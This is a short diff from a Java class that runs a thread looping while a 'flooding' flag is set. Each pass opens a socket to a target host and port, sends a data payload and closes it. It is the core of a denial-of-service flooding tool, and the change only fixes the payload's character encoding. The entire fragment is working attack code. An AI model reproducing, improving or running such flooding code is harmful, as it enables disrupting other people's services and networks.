@@ -19,7 +19,7 @@ public class CUSTOM extends Thread {
 		while (Constants.flooding) {
 			try {
 				Socket sock = new Socket(target, port);
-				sock.getOutputStream().write(data.getBytes());
+				sock.getOutputStream().write(data.getBytes("UTF-8"));
 				sock.close();
 			} catch (Exception ex) {
 				ex.printStackTrace();
